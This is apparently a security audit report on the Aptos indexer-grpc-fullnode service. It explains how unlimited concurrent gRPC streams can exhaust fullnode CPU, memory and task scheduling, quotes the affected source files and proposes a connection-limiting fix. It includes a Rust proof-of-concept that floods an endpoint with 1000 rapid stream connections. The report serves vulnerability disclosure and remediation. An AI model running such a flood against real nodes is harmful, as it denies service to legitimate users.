# Audit Report

## Title
Unbounded Concurrent Stream Creation Enables Resource Exhaustion in Fullnode Indexer gRPC Service

## Summary
The `FullnodeDataService::get_transactions_from_node` method lacks rate limiting and connection tracking, allowing an attacker to rapidly open gRPC stream connections and exhaust fullnode resources through unbounded tokio task spawning, memory allocation, and database query execution.

## Finding Description
The indexer-grpc-fullnode service implements a gRPC streaming endpoint for transaction data without any protection against concurrent connection abuse. [1](#0-0) 

Each incoming `get_transactions_from_node` request immediately spawns a new tokio task with full resource allocation: [2](#0-1) 

The `IndexerStreamCoordinator` created for each stream spawns up to `processor_task_count` (default 20) additional parallel processing tasks: [3](#0-2) 

**Critical Missing Protections:**

1. **No Rate Limiting**: The server setup includes HTTP/2 keepalive but no connection rate limiting: [4](#0-3) 

2. **No Connection Tracking**: Unlike `indexer-grpc-data-service-v2` which has a `ConnectionManager`, the fullnode service has no tracking of active streams.

3. **No Concurrency Limits**: The configuration only controls per-stream parameters, not total concurrent streams: [5](#0-4) 

**Attack Execution:**
1. Attacker opens N concurrent gRPC connections to `/aptos.internal.fullnode.v1.FullnodeData/GetTransactionsFromNode`
2. Each connection spawns 1 main task + up to 20 processor tasks
3. Each task allocates channels (default 35 capacity), fetches from database, and processes transactions
4. Attacker immediately closes connections or never reads from stream
5. Resources are allocated before cleanup detection occurs
6. Repeat rapidly to exhaust: tokio task scheduler, memory, CPU, and database access

This violates **Invariant #9: Resource Limits** - the service does not enforce limits on concurrent operations despite claiming to respect computational limits.

## Impact Explanation
**Medium Severity** - This qualifies as a Medium severity issue under "State inconsistencies requiring intervention" because:

1. **Service Unavailability**: Legitimate users cannot access transaction data, disrupting indexer operations and dependent services
2. **Resource Exhaustion**: Fullnode CPU and memory exhaustion requires manual intervention to restore service
3. **Scope Limitation**: Only affects fullnodes with `indexer_grpc.enabled = true`, not core consensus validators
4. **No Consensus Impact**: Does not affect validator operations, block production, or chain safety

While this causes availability issues, it's limited to the auxiliary indexer service rather than core blockchain functionality, placing it at Medium rather than High severity.

## Likelihood Explanation
**High Likelihood** of exploitation:

1. **No Authentication Required**: The gRPC endpoint is publicly accessible
2. **Trivial to Execute**: Standard gRPC clients can rapidly open connections
3. **Immediate Effect**: Resource exhaustion occurs within seconds of attack initiation
4. **No Special Tools Required**: Any gRPC client library can execute the attack
5. **Difficult to Distinguish**: Rapid reconnection patterns may appear as legitimate retry behavior initially

The attack requires minimal technical sophistication and provides immediate disruptive impact.

## Recommendation

Implement connection tracking and rate limiting in `FullnodeDataService`. Add a connection manager similar to `indexer-grpc-data-service-v2`:

```rust
// In fullnode_data_service.rs
pub struct FullnodeDataService {
    pub service_context: ServiceContext,
    pub abort_handle: Arc<AtomicBool>,
    pub connection_manager: Arc<ConnectionManager>, // ADD THIS
}

// Add to get_transactions_from_node:
async fn get_transactions_from_node(
    &self,
    req: Request<GetTransactionsFromNodeRequest>,
) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
    
    // Check current connection count
    if self.connection_manager.active_stream_count() >= MAX_CONCURRENT_STREAMS {
        return Err(Status::resource_exhausted("Too many concurrent streams"));
    }
    
    // Track connection
    let stream_id = generate_stream_id();
    self.connection_manager.insert_active_stream(stream_id, ...);
    
    // ... existing code ...
    
    // Cleanup on task completion
    tokio::spawn(async move {
        // ... stream processing ...
        self.connection_manager.remove_active_stream(stream_id);
    });
}
```

Additionally, configure `MAX_CONCURRENT_STREAMS` in `IndexerGrpcConfig`: [5](#0-4) 

Add field:
```rust
/// Maximum number of concurrent active streams
pub max_concurrent_streams: Option<usize>,
```

Set default to reasonable value (e.g., 100) based on fullnode capacity.

## Proof of Concept

```rust
// PoC: Rapid stream connection attack
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient, GetTransactionsFromNodeRequest,
};
use tokio::time::{sleep, Duration};

#[tokio::main]
async fn main() {
    let target = "http://fullnode-grpc-endpoint:50051";
    let mut tasks = vec![];
    
    // Spawn 1000 concurrent connections
    for i in 0..1000 {
        let target = target.to_string();
        let task = tokio::spawn(async move {
            let mut client = FullnodeDataClient::connect(target)
                .await
                .expect("Failed to connect");
            
            let request = GetTransactionsFromNodeRequest {
                starting_version: Some(0),
                transactions_count: Some(1000),
            };
            
            // Open stream and immediately close
            let _stream = client.get_transactions_from_node(request).await;
            // Drop immediately - connection closes but task already spawned
            
            println!("Connection {} opened and closed", i);
        });
        
        tasks.push(task);
        
        // Minimal delay between connections
        sleep(Duration::from_millis(10)).await;
    }
    
    // Wait for all tasks
    for task in tasks {
        let _ = task.await;
    }
    
    println!("Attack complete - monitor fullnode resource usage");
}
```

**Expected Behavior**: Fullnode experiences high CPU usage, memory growth, and degraded/failed response to legitimate requests due to task scheduler saturation and resource exhaustion.

**Notes**
The vulnerability exists specifically in the `indexer-grpc-fullnode` implementation, not in the newer `indexer-grpc-data-service-v2` which already includes connection management through its `ConnectionManager` component. This represents an architectural inconsistency where the older fullnode service lacks protections present in newer components. The fix should align the fullnode service with the protection mechanisms already implemented in the data service v2.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L67-117)
```rust
    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Gets configs for the stream, partly from the request and partly from the node config
        let r = req.into_inner();
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
        let processor_task_count = self.service_context.processor_task_count;
        let processor_batch_size = self.service_context.processor_batch_size;
        let output_batch_size = self.service_context.output_batch_size;
        let transaction_channel_size = self.service_context.transaction_channel_size;
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };

        // Some node metadata
        let context = self.service_context.context.clone();
        let ledger_chain_id = context.chain_id().id();

        // Creates a channel to send the stream to the client.
        let (tx, rx) = mpsc::channel(transaction_channel_size);

        // Creates a moving average to track tps
        let mut ma = MovingAverage::new(10_000);

        let abort_handle = self.abort_handle.clone();
        // This is the main thread handling pushing to the stream
        tokio::spawn(async move {
            // Initialize the coordinator that tracks starting version and processes transactions
            let mut coordinator = IndexerStreamCoordinator::new(
                context,
                starting_version,
                ending_version,
                processor_task_count,
                processor_batch_size,
                output_batch_size,
                tx.clone(),
                // For now the request for this interface doesn't include a txn filter
                // because it is only used for the txn stream filestore worker, which
                // needs every transaction. Later we may add support for txn filtering
                // to this interface too.
                None,
                Some(abort_handle.clone()),
            );
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L166-200)
```rust
        let mut tasks = vec![];
        for batch in task_batches {
            let context = self.context.clone();
            let filter = filter.clone();
            let task = tokio::task::spawn_blocking(move || {
                let raw_txns = batch;
                let api_txns = Self::convert_to_api_txns(context, raw_txns);
                let pb_txns = Self::convert_to_pb_txns(api_txns);
                // Apply filter if present.
                let pb_txns = if let Some(ref filter) = filter {
                    pb_txns
                        .into_iter()
                        .filter(|txn| filter.matches(txn))
                        .collect::<Vec<_>>()
                } else {
                    pb_txns
                };
                let mut responses = vec![];
                // Wrap in stream response object and send to channel
                for chunk in pb_txns.chunks(output_batch_size as usize) {
                    for chunk in chunk_transactions(chunk.to_vec(), MESSAGE_SIZE_LIMIT) {
                        let item = TransactionsFromNodeResponse {
                            response: Some(transactions_from_node_response::Response::Data(
                                TransactionsOutput {
                                    transactions: chunk,
                                },
                            )),
                            chain_id: ledger_chain_id as u32,
                        };
                        responses.push(item);
                    }
                }
                responses
            });
            tasks.push(task);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-104)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);
```

**File:** config/src/config/indexer_grpc_config.rs (L31-59)
```rust
#[derive(Clone, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct IndexerGrpcConfig {
    pub enabled: bool,

    /// If true, the GRPC stream interface exposed by the data service will be used
    /// instead of the standard fullnode GRPC stream interface. In other words, with
    /// this enabled, you can use an indexer fullnode like it is an instance of the
    /// indexer-grpc data service (aka the Transaction Stream Service API).
    pub use_data_service_interface: bool,

    /// The address that the grpc server will listen on.
    pub address: SocketAddr,

    /// Number of processor tasks to fan out
    pub processor_task_count: Option<u16>,

    /// Number of transactions each processor will process
    pub processor_batch_size: u16,

    /// Number of transactions returned in a single stream response
    pub output_batch_size: u16,

    /// Size of the transaction channel buffer for streaming.
    pub transaction_channel_size: usize,

    /// Maximum size in bytes for transaction filters.
    pub max_transaction_filter_size_bytes: usize,
}
```
